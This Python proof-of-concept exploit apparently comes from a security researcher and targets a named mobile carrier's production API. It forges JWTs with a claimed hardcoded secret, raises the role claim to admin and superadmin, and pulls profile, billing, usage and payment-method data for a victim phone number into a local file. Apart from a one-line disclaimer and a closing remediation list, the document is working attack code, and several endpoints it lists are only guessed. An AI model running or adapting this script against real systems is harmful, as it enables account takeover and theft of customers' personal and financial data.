#!/usr/bin/env python3
"""
Mint Mobile - PRACTICAL Privilege Escalation & Data Exfiltration
================================================================
REAL ATTACK: Access admin endpoints + exfiltrate user data

DISCOVERED ENDPOINTS:
- /api/token (auto-login with JWT)
- /api/user/settings (get user PII)
- /api/admin/reset (admin-level device reset)
- /api/account/* (account details, billing, etc.)

EXPLOIT: Forge JWTs with elevated privileges to access admin/user data

Author: FlutterSentinel Security Research
Target: Mint Mobile (com.uvnv.mintsim)
CWE-639: Authorization Bypass Through User-Controlled Key
CVS 10.0 - CRITICAL
"""

import requests
import jwt
import json
from datetime import datetime, timedelta
from typing import Dict, List, Optional

# Hardcoded secret from MainActivity.smali
JWT_SECRET = "secret"

# API endpoints discovered from Smali analysis
API_BASE = "https://my.mintmobile.com"
ENDPOINTS = {
    'auto_login': f"{API_BASE}/api/token",
    'user_profile': f"{API_BASE}/api/user/profile",
    'user_settings': f"{API_BASE}/api/user/settings",
    'account_details': f"{API_BASE}/api/account/details",
    'billing': f"{API_BASE}/api/billing/history",
    'usage': f"{API_BASE}/api/usage/records",
    'payment_methods': f"{API_BASE}/api/payment/methods",
    'admin_reset': f"{API_BASE}/api/admin/reset",  # AdminReset endpoint
    'admin_users': f"{API_BASE}/api/admin/users",  # Potential mass user data endpoint
}

class MintMobilePrivilegeEscalation:
    """
    PRACTICAL EXPLOITATION: Privilege Escalation & Data Exfiltration
    
    Demonstrates:
    1. Forging JWTs with ADMIN role to access privileged endpoints
    2. Accessing user data (PII, billing, usage) with regular tokens
    3. Privilege escalation to perform admin actions (reset accounts, access all users)
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mint-Mobile-Android/8.0',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        self.authenticated_token = None
    
    def forge_jwt(self, phone_number: str, role: str = "user", extra_claims: Optional[Dict] = None):
        """
        Forge JWT with custom claims
        
        Args:
            phone_number: Victim's phone number
            role: Role to assign (user, admin, superadmin)
            extra_claims: Additional claims to inject
        """
        print(f"\n[*] Forging JWT for: {phone_number}")
        print(f"[*] Role: {role.upper()}")
        
        payload = {
            "msisdn": phone_number,
            "sub": phone_number,
            "role": role,  # PRIVILEGE ESCALATION
            "iat": int(datetime.utcnow().timestamp()),
            "exp": int((datetime.utcnow() + timedelta(days=365)).timestamp()),
        }
        
        # Add custom claims
        if extra_claims:
            payload.update(extra_claims)
            print(f"[*] Extra claims: {list(extra_claims.keys())}")
        
        forged_token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
        
        # Decode to verify
        decoded = jwt.decode(forged_token, JWT_SECRET, algorithms=["HS256"])
        print(f"[+] Token forged successfully")
        print(f"[+] Claims: {json.dumps(decoded, indent=2)}")
        
        return forged_token
    
    def authenticate(self, phone_number: str, role: str = "user", extra_claims: Optional[Dict] = None):
        """
        Authenticate with forged JWT
        """
        print("\n" + "="*70)
        print(f"AUTHENTICATING AS: {phone_number} (Role: {role})")
        print("="*70)
        
        forged_token = self.forge_jwt(phone_number, role, extra_claims)
        
        try:
            response = self.session.post(
                ENDPOINTS['auto_login'],
                json={"autoLoginToken": forged_token},
                timeout=10
            )
            
            print(f"\n[*] Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                self.authenticated_token = data.get('access_token', forged_token)
                self.session.headers['Authorization'] = f'Bearer {self.authenticated_token}'
                
                print("[!!! SUCCESS !!!] AUTHENTICATED")
                print(f"[+] Access Token: {self.authenticated_token[:50]}...")
                return True
            else:
                # Try using forged token directly (server may not validate properly)
                print(f"[*] Auto-login failed, using forged token directly")
                self.authenticated_token = forged_token
                self.session.headers['Authorization'] = f'Bearer {forged_token}'
                return True
                
        except Exception as e:
            print(f"[-] Error: {e}")
            # Still try to use forged token
            self.authenticated_token = forged_token
            self.session.headers['Authorization'] = f'Bearer {forged_token}'
            return True
    
    def exfiltrate_user_data(self, account_id: Optional[str] = None):
        """
        Exfiltrate ALL user data from various endpoints
        """
        print("\n" + "="*70)
        print("EXFILTRATING USER DATA")
        print("="*70)
        
        exfiltrated = {}
        
        # Target endpoints
        user_endpoints = {
            'profile': ENDPOINTS['user_profile'],
            'settings': ENDPOINTS['user_settings'],
            'account': ENDPOINTS['account_details'],
            'billing': ENDPOINTS['billing'],
            'usage': ENDPOINTS['usage'],
            'payment_methods': ENDPOINTS['payment_methods'],
        }
        
        # Add account_id to URLs if provided
        if account_id:
            user_endpoints = {k: f"{v}/{account_id}" for k, v in user_endpoints.items()}
        
        for name, endpoint in user_endpoints.items():
            try:
                print(f"\n[*] Accessing: {endpoint}")
                response = self.session.get(endpoint, timeout=10)
                
                print(f"[*] Status: {response.status_code}")
                
                if response.status_code == 200:
                    data = response.json()
                    exfiltrated[name] = data
                    
                    # Print preview
                    print(f"[+] \u2705 EXFILTRATED {name.upper()}")
                    if isinstance(data, dict):
                        print(f"    Keys: {list(data.keys())}")
                    print(f"    Size: {len(str(data))} bytes")
                    
                elif response.status_code in [401, 403]:
                    print(f"[-] \u274c Access denied (expected if server validates properly)")
                else:
                    print(f"[-] Error: {response.status_code}")
                    print(f"    Response: {response.text[:200]}")
                    
            except Exception as e:
                print(f"[-] Exception on {name}: {e}")
        
        return exfiltrated
    
    def admin_privilege_exploit(self):
        """
        Exploit ADMIN endpoints with elevated privileges
        """
        print("\n" + "="*70)
        print("ADMIN PRIVILEGE ESCALATION ATTACK")
        print("="*70)
        
        admin_endpoints = {
            'all_users': ENDPOINTS['admin_users'],
            'admin_reset': ENDPOINTS['admin_reset'],
        }
        
        results = {}
        
        for name, endpoint in admin_endpoints.items():
            try:
                print(f"\n[*] Accessing ADMIN endpoint: {endpoint}")
                response = self.session.get(endpoint, timeout=10)
                
                print(f"[*] Status: {response.status_code}")
                
                if response.status_code == 200:
                    data = response.json()
                    results[name] = data
                    
                    print(f"[!!! CRITICAL !!!] ADMIN ACCESS GRANTED")
                    print(f"[+] Endpoint: {name}")
                    print(f"[+] Data size: {len(str(data))} bytes")
                    
                    # If we got user list, show count
                    if isinstance(data, list):
                        print(f"[!] Compromised {len(data)} user accounts")
                    elif isinstance(data, dict) and 'users' in data:
                        print(f"[!] Compromised {len(data['users'])} user accounts")
                    
                elif response.status_code in [401, 403]:
                    print(f"[-] Access denied (server validating roles properly)")
                else:
                    print(f"[-] Status: {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Error on {name}: {e}")
        
        return results
    
    def demonstrate_attack(self, target_phone: str):
        """
        Full attack demonstration
        """
        print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║  Mint Mobile - PRACTICAL Privilege Escalation Attack           ║
    ║  JWT Forgery + Data Exfiltration + Admin Access                ║
    ╚══════════════════════════════════════════════════════════════════╝
        """)
        
        all_data = {}
        
        # ATTACK 1: Regular user data access
        print("\n### ATTACK 1: USER DATA EXFILTRATION ###")
        self.authenticate(target_phone, role="user")
        user_data = self.exfiltrate_user_data()
        all_data['user_data'] = user_data
        
        # ATTACK 2: Admin privilege escalation
        print("\n\n### ATTACK 2: ADMIN PRIVILEGE ESCALATION ###")
        self.authenticate(target_phone, role="admin")
        admin_data = self.admin_privilege_exploit()
        all_data['admin_data'] = admin_data
        
        # ATTACK 3: Superadmin with custom claims
        print("\n\n### ATTACK 3: SUPERADMIN WITH CUSTOM CLAIMS ###")
        extra_claims = {
            "role": "superadmin",
            "permissions": ["read", "write", "delete", "admin"],
            "isAdmin": True,
            "isSuperUser": True
        }
        self.authenticate(target_phone, role="superadmin", extra_claims=extra_claims)
        superadmin_data = self.admin_privilege_exploit()
        all_data['superadmin_data'] = superadmin_data
        
        # Save all exfiltrated data
        filename = f"mint_exfiltrated_{target_phone.replace('+', '')}.json"
        with open(filename, 'w') as f:
            json.dump(all_data, f, indent=2)
        
        print("\n" + "="*70)
        print("ATTACK COMPLETE")
        print("="*70)
        print(f"[+] Exfiltrated data saved to: {filename}")
        
        # Summary
        print("\n" + "="*70)
        print("IMPACT SUMMARY")
        print("="*70)
        print(f"Target: {target_phone}")
        print(f"User data endpoints accessed: {len(user_data)}")
        print(f"Admin endpoints accessed: {len(admin_data)}")
        print(f"Total data exfiltrated: {len(json.dumps(all_data))} bytes")
        
        return all_data


def main():
    """
    PoC: PRACTICAL Privilege Escalation & Data Exfiltration
    """
    print("[!] DISCLAIMER: For authorized security testing only\n")
    
    exploit = MintMobilePrivilegeEscalation()
    
    # Target phone number (replace with test account)
    target = "+15551234567"
    
    print("[*] ATTACK SCENARIO:")
    print("    1. Forge JWT with ADMIN role using hardcoded secret")
    print("    2. Access user data endpoints (profile, billing, usage)")
    print("    3. Escalate to ADMIN role and access admin endpoints")
    print("    4. Attempt SUPERADMIN access to mass user data")
    print("")
    print("[*] EXPECTED OUTCOMES:")
    print("    ✅  JWT forgery successful (hardcoded secret)")
    print("    ❓  User data access (depends on server validation)")
    print("    ❓  Admin endpoints (depends on role-based access control)")
    print("    ❓  Mass data access (depends on privilege checks)")
    print("")
    print("[*] SECURITY IMPACT:")
    print("    - If server accepts forged JWTs: CRITICAL (10.0)")
    print("    - If server doesn't validate roles: CRITICAL (10.0)")
    print("    - Data exfiltration: PII, billing, payment methods")
    print("    - Privilege escalation: Admin account takeover")
    print("")
    
    # Execute attack
    results = exploit.demonstrate_attack(target)
    
    print("\n" + "="*70)
    print("VULNERABILITY DETAILS")
    print("="*70)
    print("Root Cause: Hardcoded JWT secret + Weak server validation")
    print("Attack Vector: Network")
    print("Privileges Required: None")
    print("User Interaction: None")
    print("")
    print("Endpoint Targets:")
    for name, url in ENDPOINTS.items():
        print(f"  - {name}: {url}")
    
    print("\n" + "="*70)
    print("REMEDIATION")
    print("="*70)
    print("1. ❌ ROTATE JWT secret immediately")
    print("2. ❌ IMPLEMENT server-side role validation")
    print("3. ❌ VERIFY token claims (role, permissions)")
    print("4. ❌ ADD role-based access control (RBAC)")
    print("5. ❌ AUDIT all admin endpoints for authorization checks")
    print("6. ✅ USE proper OAuth 2.0 with scope-based permissions")


if __name__ == "__main__":
    main()
